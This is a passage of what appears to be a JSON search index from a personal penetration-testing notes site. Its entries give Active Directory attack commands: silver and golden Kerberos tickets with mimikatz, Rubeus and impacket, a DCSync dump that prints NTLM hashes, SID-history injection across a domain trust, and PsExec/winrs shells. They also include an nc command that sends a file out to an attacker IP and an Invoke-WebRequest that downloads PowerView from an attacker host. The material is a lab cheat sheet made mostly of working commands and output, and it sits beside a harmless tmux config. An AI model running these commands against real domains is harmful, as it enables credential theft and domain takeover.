class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: tengu.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: SQL.tengu.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Tree_Name: tengu.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-08-22T08:14:23+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eSQL.tengu.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-03-24T13:19:50\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2024-09-23T13:19:50\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eRCE :\nhttps://gist.github.com/qkaiser/79459c3cb5ea6e658701c7d203a8c297\u003c/p\u003e","tags":[],"title":"Tengu"},{"content":"Silver Ticket :\nOn Linux\npython ticketer.py -nthash \u0026lt;HASH\u0026gt; -domain-sid \u0026lt;DOMAIN_SID\u0026gt; -domain \u0026lt;DOMAIN\u0026gt; -spn \u0026lt;SERVICE_PRINCIPAL_NAME\u0026gt; \u0026lt;USER\u0026gt; export KRB5CCNAME=/root/impacket-examples/\u0026lt;TICKET_NAME\u0026gt;.ccache python psexec.py \u0026lt;DOMAIN\u0026gt;/\u0026lt;USER\u0026gt;@\u0026lt;TARGET\u0026gt; -k -no-pass\rOn Windows\n# Create the ticket mimikatz.exe \u0026#34;kerberos::golden /domain:\u0026lt;DOMAIN\u0026gt; /sid:\u0026lt;DOMAIN_SID\u0026gt; /rc4:\u0026lt;HASH\u0026gt; /user:\u0026lt;USER\u0026gt; /service:\u0026lt;SERVICE\u0026gt; /target:\u0026lt;TARGET\u0026gt;\u0026#34; # Inject the ticket mimikatz.exe \u0026#34;kerberos::ptt \u0026lt;TICKET_FILE\u0026gt;\u0026#34; .\\Rubeus.exe ptt /ticket:\u0026lt;TICKET_FILE\u0026gt; # Obtain a shell .\\PsExec.exe -accepteula \\\\\u0026lt;TARGET\u0026gt; cmd\rGolden Ticket :\nOn Windows\nDCsync : mimikatz # lsadump::dcsync /all /csv Result : [DC] \u0026#39;lab.trusted.vl\u0026#39; will be the domain [DC] \u0026#39;labdc.lab.trusted.vl\u0026#39; will be the DC server [DC] Exporting domain \u0026#39;lab.trusted.vl\u0026#39; 1104 rsmith 30ef48d2054363df9244bc0d476e93dd 66048 502 krbtgt c7a03c565c68c6fac5f8913fab576ebd 514 1106 ewalters 56d93bd5a8250652c7430a4467a8540a 66048 500 Administrator 75878369ad33f35b7070ca854100bc07 66048 1107 cpowers 322db798a55f85f09b3d61b976a13c43 66048 1000 LABDC$ c101e5fcd553128d23a62df1c509a576 532480 1103 TRUSTED$ 182161c2718e1d45b2202d6e35a7eb6e 2080\rCreating Golden ticket : mimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt\rLoad the ticket to get the shell on root domain trusteddc.trusted.vl mimikatz: kerberos::ptt ticket.kirbi winrs -r:trusteddc.trusted.vl cmd #or Enter-PSSession trusteddc.trusted.vl #Or .\\PsExec.exe -accepteula \\\\\u0026lt;TARGET\u0026gt; cmd\rOn Linux\nModifying krb5.conf : [libdefaults] default_realm = INFILTRATOR.HTB [realms] INFILTRATOR.HTB = { kdc = 10.10.11.31 admin_server = 10.10.11.31 } [domain_realm] .infiltrator.htb = INFILTRATOR.HTB infiltrator.htb = INFILTRATOR.HTB\rObtain Tgt ticket : getTGT.py \u0026#39;infiltrator.htb\u0026#39;/\u0026#39;d.anderson\u0026#39;@10.129.62.59 #or getTGT.py \u0026#39;infiltrator.htb\u0026#39;/\u0026#39;d.anderson\u0026#39;:\u0026#39;WAT?watismypass!\u0026#39; -dc-ip 10.129.62.59\r","date":"2023-09-07","id":108,"permalink":"/notes/ad/tickets/","summary":"\u003cp\u003e\u003cstrong\u003eSilver Ticket :\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eOn Linux\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython ticketer.py -nthash \u0026lt;HASH\u0026gt; -domain-sid \u0026lt;DOMAIN_SID\u0026gt; -domain \u0026lt;DOMAIN\u0026gt; -spn \u0026lt;SERVICE_PRINCIPAL_NAME\u0026gt; \u0026lt;USER\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003eKRB5CCNAME\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/root/impacket-examples/\u0026lt;TICKET_NAME\u0026gt;.ccache \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython psexec.py \u0026lt;DOMAIN\u0026gt;/\u0026lt;USER\u0026gt;@\u0026lt;TARGET\u0026gt; -k -no-pass\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eOn Windows\u003c/p\u003e","tags":[],"title":"Tickets"},{"content":" Tmux.conf set -g mouse on bind -n WheelUpPane if-shell -F -t = \u0026#34;#{mouse_any_flag}\u0026#34; \u0026#34;send-keys -M\u0026#34; \u0026#34;if -Ft= \u0026#39;#{pane_in_mode}\u0026#39; \u0026#39;send-keys -M\u0026#39; \u0026#39;select-pane -t=; copy-mode -e; send-keys -M\u0026#39;\u0026#34; bind -n WheelDownPane select-pane -t= \\; send-keys -M bind -n C-WheelUpPane select-pane -t= \\; copy-mode -e \\; send-keys -M bind -T copy-mode-vi C-WheelUpPane send-keys -X halfpage-up bind -T copy-mode-vi C-WheelDownPane send-keys -X halfpage-down bind -T copy-mode-emacs C-WheelUpPane send-keys -X halfpage-up bind -T copy-mode-emacs C-WheelDownPane send-keys -X halfpage-down # To copy, left click and drag to highlight text in yellow, # once you release left click yellow text will disappear and will automatically be available in clibboard # # Use vim keybindings in copy mode setw -g mode-keys vi # Update default binding of `Enter` to also use copy-pipe unbind -T copy-mode-vi Enter bind-key -T copy-mode-vi Enter send-keys -X copy-pipe-and-cancel \u0026#34;xclip -selection c\u0026#34; bind-key -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel \u0026#34;xclip -in -selection clipboard\u0026#34; # List of plugins set -g @plugin \u0026#39;tmux-plugins/tpm\u0026#39; set -g @plugin \u0026#39;tmux-plugins/tmux-sensible\u0026#39; set -g @plugin \u0026#39;arcticicestudio/nord-tmux\u0026#39; # Other examples: # set -g @plugin \u0026#39;github_username/plugin_name\u0026#39; # set -g @plugin \u0026#39;github_username/plugin_name#branch\u0026#39; # set -g @plugin \u0026#39;git@github.com:user/plugin\u0026#39; # set -g @plugin \u0026#39;git@bitbucket.com:user/plugin\u0026#39; # Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf) run \u0026#39;~/.tmux/plugins/tpm/tpm\u0026#39;\rInstall plugin : https://github.com/tmux-plugins/tpm#installing-plugins https://www.nordtheme.com/docs/ports/tmux/installation https://github.com/fxbrit/nord-extended Prefix = ctrl + b + I\rAnd install Xclip :\nsudo apt install xclip\r","date":"2023-09-07","id":109,"permalink":"/notes/ressources/tmux/","summary":"\u003cul\u003e\n\u003cli\u003eTmux.conf\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -g mouse on\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e -n WheelUpPane \u003cspan class=\"k\"\u003eif\u003c/span\u003e-shell -F -t \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;#{mouse_any_flag}\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;send-keys -M\u0026#34;\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;if -Ft= \u0026#39;#{pane_in_mode}\u0026#39; \u0026#39;send-keys -M\u0026#39; \u0026#39;select-pane -t=; copy-mode -e; send-keys -M\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e -n WheelDownPane \u003cspan class=\"k\"\u003eselect\u003c/span\u003e-pane -t\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e send-keys -M\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e -n C-WheelUpPane \u003cspan class=\"k\"\u003eselect\u003c/span\u003e-pane -t\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e copy-mode -e \u003cspan class=\"se\"\u003e\\;\u003c/span\u003e send-keys -M\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e -T copy-mode-vi    C-WheelUpPane   send-keys -X halfpage-up\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e -T copy-mode-vi    C-WheelDownPane send-keys -X halfpage-down\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e -T copy-mode-emacs C-WheelUpPane   send-keys -X halfpage-up\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ebind\u003c/span\u003e -T copy-mode-emacs C-WheelDownPane send-keys -X halfpage-down\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# To copy, left click and drag to highlight text in yellow, \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# once you release left click yellow text will disappear and will automatically be available in clibboard\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# # Use vim keybindings in copy mode\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esetw -g mode-keys vi\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Update default binding of `Enter` to also use copy-pipe\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eunbind -T copy-mode-vi Enter\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind-key -T copy-mode-vi Enter send-keys -X copy-pipe-and-cancel \u003cspan class=\"s2\"\u003e\u0026#34;xclip -selection c\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebind-key -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel \u003cspan class=\"s2\"\u003e\u0026#34;xclip -in -selection clipboard\u0026#34;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# List of plugins\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -g @plugin \u003cspan class=\"s1\"\u003e\u0026#39;tmux-plugins/tpm\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -g @plugin \u003cspan class=\"s1\"\u003e\u0026#39;tmux-plugins/tmux-sensible\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eset\u003c/span\u003e -g @plugin \u003cspan class=\"s1\"\u003e\u0026#39;arcticicestudio/nord-tmux\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Other examples:\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set -g @plugin \u0026#39;github_username/plugin_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set -g @plugin \u0026#39;github_username/plugin_name#branch\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set -g @plugin \u0026#39;git@github.com:user/plugin\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# set -g @plugin \u0026#39;git@bitbucket.com:user/plugin\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e# Initialize TMUX plugin manager (keep this line at the very bottom of tmux.conf)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erun \u003cspan class=\"s1\"\u003e\u0026#39;~/.tmux/plugins/tpm/tpm\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eInstall plugin :\nhttps://github.com/tmux-plugins/tpm#installing-plugins\nhttps://www.nordtheme.com/docs/ports/tmux/installation\nhttps://github.com/fxbrit/nord-extended\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cpre tabindex=\"0\"\u003e\u003ccode\u003ePrefix = ctrl + b + I\u003c/code\u003e\u003c/pre\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eAnd install Xclip :\u003c/p\u003e","tags":[],"title":"Tmux"},{"content":"SMB :\nLinux machine: smbserver.py smb share/ -smb2support\rWindows machine: net use \\\\ip\\smb\rNC :\nnc -lvnp 4444 \u0026gt; new_file #receving machine nc.exe -vn 10.8.3.12 4444 \u0026lt; exfil_file #sending machine\rFTP :\npip3 install pyftpdlib python3 -m pyftpdlib -p 21\r","date":"2023-09-07","id":110,"permalink":"/notes/ad/transfert/","summary":"\u003cp\u003e\u003cstrong\u003eSMB :\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eLinux machine:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esmbserver.py smb share/ -smb2support\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eWindows machine:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enet use \u003cspan class=\"se\"\u003e\\\\\u003c/span\u003eip\u003cspan class=\"se\"\u003e\\s\u003c/span\u003emb\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eNC :\u003c/strong\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc -lvnp \u003cspan class=\"m\"\u003e4444\u003c/span\u003e \u0026gt; new_file \u003cspan class=\"c1\"\u003e#receving machine\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enc.exe -vn 10.8.3.12 \u003cspan class=\"m\"\u003e4444\u003c/span\u003e \u0026lt; exfil_file \u003cspan class=\"c1\"\u003e#sending machine\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003cstrong\u003eFTP :\u003c/strong\u003e\u003c/p\u003e","tags":[],"title":"Transfert"},{"content":"Trust Bidirectional To perform this attack after compromising a child domain, we need the following:\nThe KRBTGT hash for the child domain\nThe SID for the child domain\nThe name of a target user in the child domain (does not need to exist!)\nThe FQDN of the child domain.\nThe SID of the Enterprise Admins group of the root domain.\nWith this data collected, the attack can be performed with Mimikatz.\nTrust Relationship :\nInvoke-WebRequest -Uri \u0026#34;http://10.8.3.12:8080/PowerView.ps1\u0026#34; -OutFile \u0026#34;C:\\Users\\administrator\\Desktop\\powerview.ps1\u0026#34; Import-Module ./PowerView.ps1 Get-NetDomainTrust\rOr :\nPowershell Built-in cmdlet : ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()\rThe SID for the child domain and parents Get-DomainSID # Child Get-DomainGroup -Domain trusted.vl -Identity \u0026#34;Enterprise Admins\u0026#34; \\| select distinguishedname,objectsid`\rAlso we can use Mimikatz : lsadump::trust\rIn order for an attacker to grant themselves Enterprise Admin rights, they can simply add “-519” at the end of the Parent Domain’s Security Identifier (SID). This allows them to trick the system into recognizing their account as a member of the Enterprise Admins group, even though they are not actually part of it.\nCurrent domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866) Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591-519)\rThe KRBTGT hash for the child domain: using DCSync Attack : mimikatz # lsadump::dcsync /all /csv Result : [DC] \u0026#39;lab.trusted.vl\u0026#39; will be the domain [DC] \u0026#39;labdc.lab.trusted.vl\u0026#39; will be the DC server [DC] Exporting domain \u0026#39;lab.trusted.vl\u0026#39; 1104 rsmith 30ef48d2054363df9244bc0d476e93dd 66048 502 krbtgt c7a03c565c68c6fac5f8913fab576ebd 514 1106 ewalters 56d93bd5a8250652c7430a4467a8540a 66048 500 Administrator 75878369ad33f35b7070ca854100bc07 66048 1107 cpowers 322db798a55f85f09b3d61b976a13c43 66048 1000 LABDC$ c101e5fcd553128d23a62df1c509a576 532480 1103 TRUSTED$ 182161c2718e1d45b2202d6e35a7eb6e 2080\rCreating Golden ticket : mimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt\rDump NTDS : lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all #Then connect with the hash win evil-winrm\ror Without ptt :\nmimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 Load the ticket to get the shell on root domain trusteddc.trusted.vl mimikatz: kerberos::ptt ticket.kirbi\rwinrs -r:trusteddc.trusted.vl cmd / Enter-PSSession trusteddc.trusted.vl\rOther option:\nExecute a cmd in the remote machine with PsExec:\n.\\PsExec.exe -accepteula \\\\\u0026lt;remote_hostname\u0026gt; cmd\r","date":"2023-09-07","id":111,"permalink":"/notes/ad/trust-attack/","summary":"\u003ch4 id=\"trust--bidirectional\"\u003e\u003cstrong\u003eTrust  Bidirectional\u003c/strong\u003e\u003c/h4\u003e\n\u003cp\u003eTo perform this attack after compromising a child domain, we need the following:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eThe KRBTGT hash for the child domain\u003c/p\u003e","tags":[],"title":"Trust Attack"},{"content":"Scan 1 :\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-28 04:01:47Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services |_ssl-date: 2024-07-28T04:02:50+00:00; 0s from scanner time. | ssl-cert: Subject: commonName=trusteddc.trusted.vl | Not valid before: 2024-07-27T03:53:47 |_Not valid after: 2025-01-26T03:53:47 | rdp-ntlm-info: | Target_Name: TRUSTED | NetBIOS_Domain_Name: TRUSTED | NetBIOS_Computer_Name: TRUSTEDDC | DNS_Domain_Name: trusted.vl | DNS_Computer_Name: trusteddc.trusted.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-07-28T04:02:42+00:00 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49672/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49687/tcp open msrpc Microsoft Windows RPC 49988/tcp open msrpc Microsoft Windows RPC 56896/tcp open msrpc Microsoft Windows RPC 63538/tcp open msrpc Microsoft Windows RPC Service Info: Host: TRUSTEDDC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-07-28T04:02:43 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rScan 2 :\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6) | http-title: Welcome to XAMPP |_Requested resource was http://10.10.196.22/dashboard/ |_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-07-28 04:08:44Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name) 443/tcp open ssl/http Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/8.1.6) | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time | http-title: Welcome to XAMPP |_Requested resource was https://10.10.196.22/dashboard/ | ssl-cert: Subject: commonName=localhost | Not valid before: 2009-11-10T23:48:47 |_Not valid after: 2019-11-08T23:48:47 |_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/8.1.6 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: trusted.vl0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 3306/tcp open mysql MySQL 5.5.5-10.4.24-MariaDB | mysql-info: | Protocol: 10 | Version: 5.5.5-10.4.24-MariaDB | Thread ID: 9 | Capabilities flags: 63486 | Some Capabilities: Speaks41ProtocolOld, SupportsTransactions, FoundRows, SupportsCompression, InteractiveClient, ConnectWithDatabase, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, Support41Auth, IgnoreSpaceBeforeParenthesis, Speaks41ProtocolNew, IgnoreSigpipes, LongColumnFlag, ODBCClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults | Status: Autocommit | Salt: 8m@5\u0026#39;b96C,S\u0026lt;rLe6y\u0026amp;L, |_ Auth Plugin Name: mysql_native_password 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=labdc.lab.trusted.vl | Not valid before: 